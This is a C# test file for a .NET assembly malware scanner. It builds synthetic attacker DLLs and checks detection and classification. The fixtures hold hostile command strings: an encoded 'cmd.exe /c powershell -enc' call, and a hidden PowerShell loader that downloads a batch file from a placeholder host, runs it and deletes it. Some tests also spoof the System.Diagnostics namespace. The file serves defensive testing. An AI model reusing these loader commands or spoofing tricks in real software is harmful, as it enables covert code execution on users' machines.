using FluentAssertions;
using MLVScan.Abstractions;
using MLVScan.Core.Tests.TestUtilities;
using MLVScan.Models;
using MLVScan.Services;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Integration;

public class SecurityRegressionEdgeCaseTests
{
    [Fact]
    public void Scan_InvalidManagedAssemblyStream_WithVirtualPath_ReturnsVisibleScannerWarning()
    {
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());
        using var stream = new MemoryStream([0x4d, 0x5a, 0x90, 0x00, 0x00]);

        var findings = scanner.Scan(stream, "uploaded-malware.dll").ToList();

        findings.Should().ContainSingle();
        findings[0].RuleId.Should().Be("AssemblyScanner");
        findings[0].Location.Should().Be("uploaded-malware.dll");
        findings[0].Severity.Should().Be(Severity.Low);
        findings[0].Description.Should().Contain("could not be scanned");
    }

    [Fact]
    public void Scan_InvalidManagedAssemblyStream_MapsToManualReviewRequired()
    {
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());
        var invalidBytes = new byte[] { 0x4d, 0x5a, 0x90, 0x00, 0x00 };
        using var stream = new MemoryStream(invalidBytes);

        var findings = scanner.Scan(stream, "uploaded-malware.dll").ToList();
        var result = ScanResultMapper.ToDto(findings, "uploaded-malware.dll", invalidBytes, false);

        result.AnalysisCompleteness.Status.Should().Be("Incomplete");
        result.AnalysisCompleteness.ReviewRecommended.Should().BeTrue();
        result.Disposition.Should().NotBeNull();
        result.Disposition!.Classification.Should().Be("ManualReviewRequired");
        result.Disposition.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Scan_PostAnalysisRuleFailure_DoesNotEraseAlreadyDetectedProcessExecution()
    {
        var builder = TestAssemblyBuilder.Create("ThrowsAfterFinding");
        var assembly = builder
            .AddType("Attacker.Loader")
            .AddMethod("Run")
            .EmitString("cmd.exe")
            .EmitString("/c powershell -enc SQBFAFgA")
            .EmitCallWithParams(
                "System.Diagnostics.Process",
                "Start",
                null,
                builder.Module.TypeSystem.String,
                builder.Module.TypeSystem.String)
            .EndMethod()
            .EndType()
            .Build();
        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;

        var rules = RuleFactory.CreateDefaultRules().Concat([new ThrowingPostAnalysisRule()]);
        var scanner = new AssemblyScanner(rules);

        var findings = scanner.Scan(stream, "ThrowsAfterFinding.dll").ToList();

        findings.Should().Contain(f =>
            f.RuleId == "ProcessStartRule" &&
            f.Description.Contains("cmd.exe", StringComparison.OrdinalIgnoreCase));
        findings.Should().Contain(f =>
            f.RuleId == "AssemblyScanner" &&
            f.Location == "ThrowsAfterFinding.dll" &&
            f.Description.Contains("could not be scanned", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Scan_FakeSystemDiagnosticsProcessInUserAssembly_IsNotSuppressedAsFrameworkCode()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("NamespaceSpoofingPayload", new Version(1, 0, 0, 0)),
            "NamespaceSpoofingPayload",
            ModuleKind.Dll);
        var module = assembly.MainModule;

        var fakeProcess = new TypeDefinition(
            "System.Diagnostics",
            "Process",
            TypeAttributes.Public | TypeAttributes.Class,
            module.TypeSystem.Object);
        module.Types.Add(fakeProcess);
        var fakeStart = new MethodDefinition(
            "Start",
            MethodAttributes.Public | MethodAttributes.Static,
            module.TypeSystem.Void);
        fakeStart.Parameters.Add(new ParameterDefinition("fileName", ParameterAttributes.None, module.TypeSystem.String));
        fakeStart.Body = new MethodBody(fakeStart);
        fakeStart.Body.GetILProcessor().Emit(OpCodes.Ret);
        fakeProcess.Methods.Add(fakeStart);

        var callerType = new TypeDefinition(
            "Attacker",
            "Runner",
            TypeAttributes.Public | TypeAttributes.Class,
            module.TypeSystem.Object);
        module.Types.Add(callerType);
        var caller = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        caller.Body = new MethodBody(caller);
        callerType.Methods.Add(caller);
        var il = caller.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "powershell.exe");
        il.Emit(OpCodes.Call, fakeStart);
        il.Emit(OpCodes.Ret);

        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());

        var findings = scanner.Scan(stream, "NamespaceSpoofingPayload.dll").ToList();

        findings.Should().Contain(f =>
            f.RuleId == "ProcessStartRule" &&
            f.Description.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Scan_HiddenPowerShellIwrTempBatchLauncher_MapsToKnownThreatFamily()
    {
        const string arguments =
            "-ep bypass -c \"iwr 'https://example.invalid/usa/USAMAGA2022.bat' -out $env:TEMP\\dl.bat -useb; " +
            "if (Test-Path $env:TEMP\\dl.bat) { Start-Process -NoNewWindow $env:TEMP\\dl.bat; " +
            "Start-Sleep -Seconds 120; Remove-Item $env:TEMP\\dl.bat -Force }\"";
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("PowerShellIwrTempBatchLauncher", new Version(1, 0, 0, 0)),
            "PowerShellIwrTempBatchLauncher",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("HutongGames.PlayMaker", "ObjectTypeAttribute", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("Load", MethodAttributes.Private | MethodAttributes.Static, module.TypeSystem.Void);
        method.Body = new MethodBody(method) { InitLocals = true };
        type.Methods.Add(method);

        var processStartInfoType = CreateType(module, "System.Diagnostics.ProcessStartInfo");
        method.Body.Variables.Add(new VariableDefinition(processStartInfoType));
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, CreateConstructor(module, "System.Diagnostics.ProcessStartInfo"));
        il.Emit(OpCodes.Stloc_0);
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Ldstr, "powershell.exe");
        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_FileName", module.TypeSystem.Void, module.TypeSystem.String));
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Ldstr, arguments);
        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_Arguments", module.TypeSystem.Void, module.TypeSystem.String));
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Call, CreateStaticMethod(module, "System.IO.Path", "GetTempPath", module.TypeSystem.String));
        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_WorkingDirectory", module.TypeSystem.Void, module.TypeSystem.String));
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Ldc_I4_1);
        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_UseShellExecute", module.TypeSystem.Void, module.TypeSystem.Boolean));
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Ldc_I4_1);
        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_WindowStyle", module.TypeSystem.Void, CreateType(module, "System.Diagnostics.ProcessWindowStyle")));
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Ldc_I4_1);
        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_CreateNoWindow", module.TypeSystem.Void, module.TypeSystem.Boolean));
        il.Emit(OpCodes.Ldloc_0);
        il.Emit(OpCodes.Call, CreateStaticMethod(module, "System.Diagnostics.Process", "Start", CreateType(module, "System.Diagnostics.Process"), processStartInfoType));
        il.Emit(OpCodes.Pop);
        il.Emit(OpCodes.Ret);

        byte[] assemblyBytes;
        using var stream = new MemoryStream();
        assembly.Write(stream);
        assemblyBytes = stream.ToArray();
        stream.Position = 0;
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());
        var findings = scanner.Scan(stream, "PowerShellIwrTempBatchLauncher.dll").ToList();
        var result = ScanResultMapper.ToDto(findings, "PowerShellIwrTempBatchLauncher.dll", assemblyBytes, false);

        findings.Should().ContainSingle(f =>
            f.RuleId == "ProcessStartRule" &&
            f.Severity == Severity.Critical &&
            f.Description.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase) &&
            f.Description.Contains("-ep bypass", StringComparison.OrdinalIgnoreCase) &&
            f.Description.Contains("iwr", StringComparison.OrdinalIgnoreCase) &&
            f.Description.Contains("dl.bat", StringComparison.OrdinalIgnoreCase) &&
            f.Description.Contains("Start-Process", StringComparison.OrdinalIgnoreCase) &&
            f.Description.Contains("Remove-Item", StringComparison.OrdinalIgnoreCase) &&
            f.Description.Contains("Staged loader chain", StringComparison.OrdinalIgnoreCase));
        result.ThreatFamilies.Should().NotBeNullOrEmpty();
        result.ThreatFamilies!.Should().Contain(match =>
            match.FamilyId == "family-powershell-iwr-dlbat-v1" &&
            match.ExactHashMatch == false);
        result.Disposition.Should().NotBeNull();
        result.Disposition!.Classification.Should().Be("KnownThreat");
    }

    [Fact]
    public void Scan_RecursiveHelperResolvingProcessTarget_TerminatesAndStillReportsExecution()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("RecursiveResolverPayload", new Version(1, 0, 0, 0)),
            "RecursiveResolverPayload",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Attacker", "ResolverLoop", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(type);
        var fakeProcess = new TypeDefinition("System.Diagnostics", "Process", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(fakeProcess);
        var fakeStart = new MethodDefinition("Start", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        fakeStart.Parameters.Add(new ParameterDefinition("fileName", ParameterAttributes.None, module.TypeSystem.String));
        fakeStart.Body = new MethodBody(fakeStart);
        fakeStart.Body.GetILProcessor().Emit(OpCodes.Ret);
        fakeProcess.Methods.Add(fakeStart);

        var helper = new MethodDefinition("BuildTarget", MethodAttributes.Private | MethodAttributes.Static, module.TypeSystem.String);
        helper.Body = new MethodBody(helper);
        type.Methods.Add(helper);
        var helperIl = helper.Body.GetILProcessor();
        helperIl.Emit(OpCodes.Call, helper);
        helperIl.Emit(OpCodes.Ret);

        var caller = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        caller.Body = new MethodBody(caller);
        type.Methods.Add(caller);
        var callerIl = caller.Body.GetILProcessor();
        callerIl.Emit(OpCodes.Call, helper);
        callerIl.Emit(OpCodes.Call, fakeStart);
        callerIl.Emit(OpCodes.Ret);

        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());

        var findings = scanner.Scan(stream, "RecursiveResolverPayload.dll").ToList();

        findings.Should().Contain(f =>
            f.RuleId == "ProcessStartRule" &&
            f.Description.Contains("unknown", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Scan_UncorrelatedRelativeAssemblyPath_RetainsLowAuditFinding()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("OptionalDependencyLoader", new Version(1, 0, 0, 0)),
            "OptionalDependencyLoader",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Legit", "PluginLoader", TypeAttributes.Public | TypeAttributes.Class,
            module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("LoadOptionalDependency",
            MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        var loadFrom = CreateStaticMethod(module, "System.Reflection.Assembly", "LoadFrom",
            CreateType(module, "System.Reflection.Assembly"), module.TypeSystem.String);
        il.Emit(OpCodes.Ldstr, "Plugins\\OptionalDependency.dll");
        il.Emit(OpCodes.Call, loadFrom);
        il.Emit(OpCodes.Pop);
        il.Emit(OpCodes.Ret);

        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());

        var findings = scanner.Scan(stream, "OptionalDependencyLoader.dll").ToList();

        findings.Should().ContainSingle(f => f.RuleId == "AssemblyDynamicLoadRule");
        findings.Single(f => f.RuleId == "AssemblyDynamicLoadRule").Severity.Should().Be(Severity.Low);
    }

    private sealed class ThrowingPostAnalysisRule : IScanRule
    {
        public string Description => "Throws during post-analysis";
        public Severity Severity => Severity.Low;
        public string RuleId => nameof(ThrowingPostAnalysisRule);
        public bool RequiresCompanionFinding => false;
        public bool IsSuspicious(MethodReference method) => false;

        public IEnumerable<ScanFinding> PostAnalysisRefine(ModuleDefinition module, IEnumerable<ScanFinding> existingFindings)
        {
            throw new InvalidOperationException("simulated post-analysis failure");
        }
    }

    private static MethodReference CreateStaticMethod(
        ModuleDefinition module,
        string declaringTypeFullName,
        string methodName,
        TypeReference returnType,
        params TypeReference[] parameterTypes)
    {
        var method = new MethodReference(methodName, returnType, CreateType(module, declaringTypeFullName))
        {
            HasThis = false
        };
        foreach (var parameterType in parameterTypes)
        {
            method.Parameters.Add(new ParameterDefinition(parameterType));
        }

        return method;
    }

    private static MethodReference CreateInstanceMethod(
        ModuleDefinition module,
        string declaringTypeFullName,
        string methodName,
        TypeReference returnType,
        params TypeReference[] parameterTypes)
    {
        var method = CreateStaticMethod(module, declaringTypeFullName, methodName, returnType, parameterTypes);
        method.HasThis = true;
        return method;
    }

    private static MethodReference CreateConstructor(ModuleDefinition module, string declaringTypeFullName)
    {
        return new MethodReference(".ctor", module.TypeSystem.Void, CreateType(module, declaringTypeFullName))
        {
            HasThis = true
        };
    }

    private static TypeReference CreateType(ModuleDefinition module, string fullName)
    {
        var lastDot = fullName.LastIndexOf('.');
        var ns = lastDot > 0 ? fullName[..lastDot] : "";
        var name = lastDot > 0 ? fullName[(lastDot + 1)..] : fullName;
        return new TypeReference(ns, name, module, module.TypeSystem.CoreLibrary);
    }
}
